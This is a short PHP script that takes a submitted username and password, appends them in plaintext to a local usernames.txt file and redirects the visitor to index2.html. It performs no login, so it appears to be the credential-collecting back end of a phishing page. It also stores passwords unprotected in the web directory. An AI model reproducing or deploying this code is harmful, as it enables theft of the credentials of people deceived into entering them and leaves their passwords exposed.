<?php
// Check if the form was actually submitted
if ($_SERVER["REQUEST_METHOD"] == "POST") {

    // Capture the form inputs
    $username = $_POST['username'] ?? '';
    $password = $_POST['password'] ?? '';

    // Format how the data will look inside the text file
    // Example format: username_________password
    $data_line = $username . "_________" . $password . "\n";

    // Use the correct file path relative to this script
    $file_path = __DIR__ . DIRECTORY_SEPARATOR . "usernames.txt";

    // Open (or create) usernames.txt in "append" mode ('a')
    // This ensures new entries don't overwrite older ones
    $file = fopen($file_path, "a");

    if ($file !== false) {
        // Write the data and close the file
        fwrite($file, $data_line);
        fclose($file);

        // Redirect the user to the target URL
        header("Location: index2.html");
        exit();
    } else {
        echo "Error: Unable to save your data.";
    }
} else {
    echo "Invalid request method.";
}
?>